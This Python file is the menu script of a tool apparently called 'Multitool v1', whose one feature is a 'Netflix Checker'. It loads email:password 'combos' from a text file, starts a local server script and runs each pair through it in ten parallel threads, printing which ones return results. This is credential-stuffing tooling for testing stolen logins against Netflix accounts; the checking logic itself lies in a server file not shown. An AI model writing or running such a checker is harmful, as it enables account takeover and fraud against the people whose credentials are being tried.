from Code import NetFlixChecker
from pystyle import Center
from colorama import Fore
import os
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor
import requests
from pathlib import Path
import sys
home = Path.home()

currentPath = os.getcwd()

banner = '''


███╗   ███╗██╗   ██╗██╗  ████████╗██╗████████╗ ██████╗  ██████╗ ██╗         ██╗   ██╗ ██╗
████╗ ████║██║   ██║██║  ╚══██╔══╝██║╚══██╔══╝██╔═══██╗██╔═══██╗██║         ██║   ██║███║
██╔████╔██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║         ██║   ██║╚██║
██║╚██╔╝██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║         ╚██╗ ██╔╝ ██║
██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║   ██║   ╚██████╔╝╚██████╔╝███████╗     ╚████╔╝  ██║
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝      ╚═══╝   ╚═╝
                                                                                         


'''

features = '''
[1] Netflix Checker
[0] Exit


'''

def checkCombo(combo):
    combo = combo.strip()
    if ':' in combo:
        email, password = combo.split(":", 1)
        try:
            response = requests.get(
                f"http://localhost:80/check?email={email}&password={password}",
                timeout=5
            )
            response.raise_for_status()
            try:
                return response.json()
            except ValueError:
                return f"Response is not in valid JSON format for {combo}: {response.text}"
        except requests.exceptions.RequestException as e:
            return f"Request failed for {combo}: {e}"
    else:
        return f"Invalid combo format: {combo}"

def intro():
    os.system("cls" if os.name == "nt" else "clear")
    print(Center.XCenter(Fore.LIGHTCYAN_EX + banner))
    print(Center.XCenter(Fore.LIGHTBLUE_EX + features))

    choice = int(input(Center.XCenter(Fore.GREEN + "Please enter an option >> ")))

    if choice == 0:
        exit()
    elif choice == 1:
        combos = NetFlixChecker.countCombos(currentPath + "/netflixCombos.txt")
        if not combos:
            print("There are no combos in the file...")
            time.sleep(2)
            intro()
            return
            
        print(Fore.LIGHTGREEN_EX + f"Total combos: {len(combos)}")

        print("Checking...")
        time.sleep(0.65)
        print("Starting server...")
        server_process = subprocess.Popen(
            [sys.executable, currentPath + "/code/server.py"], 
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(checkCombo, combos))

        print("Stopping server...")
        server_process.terminate()

        for result in results:
            print(result)

        time.sleep(10)
        intro()
    else:
        print("Please input a correct feature.")
        intro()

if __name__ == "__main__":
    intro()